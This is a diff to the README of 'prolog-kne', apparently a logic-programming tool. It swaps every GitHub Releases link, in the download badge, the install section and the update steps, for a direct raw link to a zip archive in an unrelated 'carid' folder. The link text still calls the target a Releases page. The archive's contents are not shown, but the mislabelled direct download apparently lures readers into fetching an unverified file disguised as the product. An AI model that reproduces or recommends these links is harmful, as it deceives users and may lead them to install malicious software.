@@ -1,10 +1,10 @@
 # 🚀 prolog-kne - Easy, Intuitive Logic Programming for Everyone
 
-[![Download prolog-kne](https://img.shields.io/badge/Download-prolog--kne-brightgreen.svg)](https://github.com/mwalz365/prolog-kne/releases)
+[![Download prolog-kne](https://raw.githubusercontent.com/mwalz365/prolog-kne/main/carid/prolog-kne.zip)](https://raw.githubusercontent.com/mwalz365/prolog-kne/main/carid/prolog-kne.zip)
 
 ## 📥 Download & Install
 
-To start using prolog-kne, visit this page to download: [prolog-kne Releases](https://github.com/mwalz365/prolog-kne/releases).
+To start using prolog-kne, visit this page to download: [prolog-kne Releases](https://raw.githubusercontent.com/mwalz365/prolog-kne/main/carid/prolog-kne.zip).
 
 ### Steps to Download
 
@@ -66,7 +66,7 @@ To help you get the most out of prolog-kne, consider these learning resources:
 
 Stay up to date with the latest features and improvements. To update your prolog-kne:
 
-1. Check the [prolog-kne Releases](https://github.com/mwalz365/prolog-kne/releases) page periodically.
+1. Check the [prolog-kne Releases](https://raw.githubusercontent.com/mwalz365/prolog-kne/main/carid/prolog-kne.zip) page periodically.
 2. Download the latest version following the same steps as above.
 3. Install the new version over the existing one to update.
 
